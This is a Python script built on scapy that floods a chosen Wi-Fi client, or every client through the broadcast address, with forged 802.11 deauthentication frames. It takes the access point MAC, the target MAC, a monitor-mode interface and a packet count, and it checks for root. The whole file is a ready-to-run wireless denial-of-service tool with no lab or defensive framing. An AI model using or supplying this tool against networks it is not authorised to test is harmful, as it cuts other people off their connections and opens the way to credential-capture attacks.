#!/usr/bin/env python3
import argparse
from scapy.all import *

def deauth(ap_mac, client_mac, interface, count):
    # Craft deauthentication packet (Dot11Deauth)
    packet = RadioTap() / Dot11(
        addr1=client_mac, addr2=ap_mac, addr3=ap_mac
    ) / Dot11Deauth()

    # Send the packet
    sendp(packet, iface=interface, count=count, verbose=1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wi-Fi Deauthentication Tool")
    parser.add_argument("-a", "--ap", help="Access Point MAC address", required=True)
    parser.add_argument("-c", "--client", help="Client MAC address (use 'FF:FF:FF:FF:FF:FF' for broadcast)", required=True)
    parser.add_argument("-i", "--interface", help="Network interface in monitor mode", required=True)
    parser.add_argument("-n", "--count", help="Number of deauth packets to send (default: 100)", type=int, default=100)
    args = parser.parse_args()

    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] Run this script as root.")
        exit(1)

    # Validate monitor mode (simplified check)
    if "monitor" not in subprocess.getoutput(f"iwconfig {args.interface}"):
        print("[!] Interface must be in monitor mode.")
        exit(1)

    try:
        print(f"[*] Sending {args.count} deauth frames to {args.client} via {args.ap}...")
        deauth(args.ap, args.client, args.interface, args.count)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
